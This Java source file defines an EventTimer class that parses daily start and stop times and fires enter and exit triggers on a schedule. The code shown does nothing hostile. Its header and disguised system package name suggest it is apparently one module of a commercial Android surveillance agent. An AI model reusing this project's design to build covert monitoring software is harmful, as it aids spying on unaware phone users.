/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.event;

import java.io.IOException;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.TimeZone;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.conf.ConfigurationException;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;

/**
 * The Class TimerEvent.
 */
public class EventTimer extends BaseTimer {
	/** The Constant TAG. */
	private static final String TAG = "EventTimer"; //$NON-NLS-1$

	/** The Constant SLEEP_TIME. */
	private static final int SLEEP_TIME = 1000;

	boolean nextDailyIn;

	/** The type. */
	private int type;

	long start, stop;

	private final long oneDayMs = 24 * 3600 * 1000;

	private Date timestart;

	private Date timestop;

	/**
	 * Instantiates a new timer event.
	 */
	public EventTimer() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " TimerEvent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * com.ht.AndroidServiceGUI.event.EventBase#parse(com.ht.AndroidServiceGUI
	 * .event .Event)
	 */
	@Override
	public boolean parse(final ConfEvent conf) {
		try {
			String ts = conf.getString("ts");
			String te = conf.getString("te");

			SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");
			timestart = df.parse(ts);
			timestop = df.parse(te);

			if (Cfg.DEBUG) {
				Check.log(TAG + " type: " + type + " ts:" + ts + " te:" + te);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}
		} catch (final ConfigurationException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
			}

			return false;
		} catch (ParseException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
			}

			return false;
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.event.EventBase#begin()
	 */
	@Override
	public void actualStart() {
		final long now = System.currentTimeMillis();
		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));

		long nextStart, nextStop;

		calendar.setTime(timestart);
		start = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
				.get(Calendar.SECOND)) * 1000;

		calendar.setTime(timestop);
		stop = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
				.get(Calendar.SECOND)) * 1000;

		nextDailyIn = setDailyDelay();

	}

	private boolean setDailyDelay() {
		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));

		long nextStart, nextStop;

		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
				.get(Calendar.SECOND)) * 1000;

		// Estriamo il prossimo evento e determiniamo il delay sulla base del
		// tipo
		if (now < start)
			nextStart = start;
		else
			nextStart = start + (3600 * 24 * 1000); // 1 Day

		if (now < stop)
			nextStop = stop;
		else
			nextStop = stop + (3600 * 24 * 1000); // 1 Day

		

		boolean ret;
		// stabilisce quale sara' il prossimo evento.
		if (nextStart < nextStop) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): Delay (next start): " + (nextStart - now)); //$NON-NLS-1$
			}
			setPeriod(nextStart - now);
			ret= true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
			}

			long delay = nextStop - now;

			setPeriod(nextStop - now);
			ret= false;
		}
		
		// verifica se al primo giro occorre chiamare OnEnter
		if (start < stop) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): start < stop ");
			}
			if (now > start && now < stop) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setDailyDelay): we are already in the brackets");
				}
				onEnter();
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): start > stop ");
			}
			if (now < stop || now > start) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setDailyDelay): we are already in the inverted brackets");
				}
				onEnter();
			}
		}
		
		return ret;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualGo() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
		}

		if (nextDailyIn) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
			}
			onEnter();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
			}
			onExit();
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
		}
		nextDailyIn = setDailyDelay();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
		}

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.event.EventBase#end()
	 */
	@Override
	public void actualStop() {
		onExit(); // di sicurezza
	}
}
